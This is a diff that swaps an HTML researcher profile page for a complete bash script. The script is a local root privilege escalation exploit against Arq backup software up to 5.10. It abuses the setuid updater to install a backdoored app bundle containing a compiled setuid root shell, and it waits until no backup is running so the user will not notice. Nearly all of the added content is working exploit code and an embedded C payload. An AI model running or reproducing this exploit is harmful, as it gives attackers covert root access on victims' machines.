@@ -1,53 +1,112 @@
-<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
-<html>
-    <head>
-        <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
-        <link rel="stylesheet" type="text/css" href="/css/style.css" />
-        <link rel="alternate" type="application/rss+xml" title="m4.rkw.io blog" href="http://m4.rkw.io/blog/rss" />
-        <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
-        <script src='https://www.google.com/recaptcha/api.js'></script>
-        <script src="/js/site.js"></script>
-        <title>Mark Wadham</title>
-    </head>
-    <body>
-        <div id="menu">
-                        <h3>Mark Wadham</h3>
-            <ul>
-                <li><a href="/index.html">profile</a></li>
-                <li><a href="/blog.html">blog</a> <a href="/blog/rss"><img src="/img/rss.png" /></a></li>
-                <li><a href="/cves.html">CVEs</a></li>
-                <li><a href="/jsdemos.html">js demos</a></li>
-                <li><a href="/contact.html">contact</a></li>
-                <li class="space small">twitter: <a href="https://twitter.com/m4rkw">m4rkw</a></li>
-                <li class="small">github: <a href="https://github.com/m4rkw">m4rkw</a></li>
-                <li class="small">linkedin: <a href="https://uk.linkedin.com/in/mark-wadham-14ab49a6">379069834</a></li>
-                <li class="red space small"></li>
-            </ul>
+#!/bin/bash
 
-        </div>
-        <div id="content">
-            <div id="main-content">
-                            <h1>Profile</h1>
+#################################################################
+###### Arq <= 5.10 local root privilege escalation exploit ######
+###### by m4rkw - https://m4.rkw.io/blog.html              ######
+#################################################################
 
-            <p>I am fluent in several programming languages and currently work as a Big Data
-            engineer.</p>
+app="/Applications/Arq.app"
+res="$app/Contents/Resources"
+lires="$app/Contents/Library/LoginItems/Arq Agent.app/Contents/Resources"
 
-            <p>In my spare time I do a bit of security research and have found vulnerabilities in
-            several popular Mac applications. I enjoy working with software vendors to help make
-            the mac software ecosystem more secure.</p>
+vuln=`ls -la "$lires/arq_updater" |grep '\-rws' |grep root`
 
-            <p>Check out my blog here: <a href="/blog.html">https://m4.rkw.io/blog.html</a></p>
+if [ "$vuln" == "" ] ; then
+  echo "Not vulnerable - auto-updates not enabled."
+  exit 1
+fi
 
-            </div>
-        </div>
-				<script>
-						(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
-						(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
-						m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
-						})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+if [ "$1" != "-f" ] ; then
+  latest_logfile="`ls -1t ~/Library/Logs/Arq\ Agent/ |head -n1`"
+  status_line="`egrep -i 'backup session.*?(ended|started)' \
+    \"$HOME/Library/Logs/Arq Agent/$latest_logfile\" |tail -n1 |grep -i started`"
 
-						ga('create', 'UA-91604161-1', 'auto');
-						ga('send', 'pageview');
-				</script>
-    </body>
-</html>
+  if [ "$status_line" != "" ] ; then
+    echo -n "WARNING: backup in progress, the user will very "
+    echo "likely notice if we exploit now!"
+    echo "use -f to override."
+    exit 1
+  fi
+fi
+
+owd="`pwd`"
+
+if [ -e ~/.arq_510_privesc_exp ] ; then
+  rm -rf ~/.arq_510_privesc_exp
+fi
+
+mkdir ~/.arq_510_privesc_exp
+cd ~/.arq_510_privesc_exp
+
+echo "copying application..."
+
+cp -R /Applications/Arq.app .
+
+echo "compiling payloads..."
+
+cat > payload.sh <<EOF
+#!/bin/bash
+rm -rf $HOME/.arq_510_privesc_exp
+while :
+do
+  pid=\`ps auxwww |grep '$app/Contents/MacOS/Arq' |grep -v grep |xargs \
+    |cut -d ' ' -f2\`
+  if [ "\$pid" != "" ] ; then
+    kill -9 \$pid
+    open $app/Contents/Library/LoginItems/Arq\ Agent.app
+    exit 0
+  fi
+done
+EOF
+chmod 755 payload.sh
+
+au_relative=`echo "$lires/standardrestorer" |sed 's/^\/Applications\///'`
+
+cat > shell.c <<EOF
+#include <unistd.h>
+#include <string.h>
+int main(int ac, char *av[])
+{
+  if (ac > 1 && strcmp(av[1], "boom") == 0) {
+    setuid(0);
+    setgid(0);
+    execl(
+      "/bin/bash","bash","-c","mv -f $res/standardrestorer.orig $res/standardr"
+      "estorer;chmod 4755 $res/standardrestorer;$HOME/.arq_510_privesc_exp/pay"
+      "load.sh;/bin/bash", NULL
+    );
+  }
+  return 0;
+}
+EOF
+mv Arq.app/Contents/Resources/standardrestorer \
+  Arq.app/Contents/Resources/standardrestorer.orig
+gcc -o Arq.app/Contents/Resources/standardrestorer shell.c
+rm -f shell.c
+
+payload_size=`stat Arq.app/Contents/Resources/standardrestorer |cut -d ' ' -f8`
+GID=`id |sed 's/^.*gid=//' |cut -d '(' -f1`
+cwd=`pwd`
+
+echo "creating backdoored Arq.zip..."
+zip -1r Arq.zip Arq.app/ 1>/dev/null 2>/dev/null
+rm -rf Arq.app/
+
+echo "executing upgrade..."
+
+"$lires/arq_updater" installupdate file://$cwd/Arq.zip $UID $GID YES \
+  1>/dev/null 2>/dev/null
+
+echo "waiting..."
+while :
+do
+  ac_size=`stat $res/standardrestorer 2>/dev/null |cut -d ' ' -f8`
+  x=`ls -la $res/standardrestorer |grep -- '-rwsr-xr-x' |grep root`
+
+  if [ "$ac_size" == "$payload_size" -a "$x" != "" ] ; then
+    cd "$owd"
+    $res/standardrestorer boom
+    exit 0
+  fi
+  sleep 0.2
+done
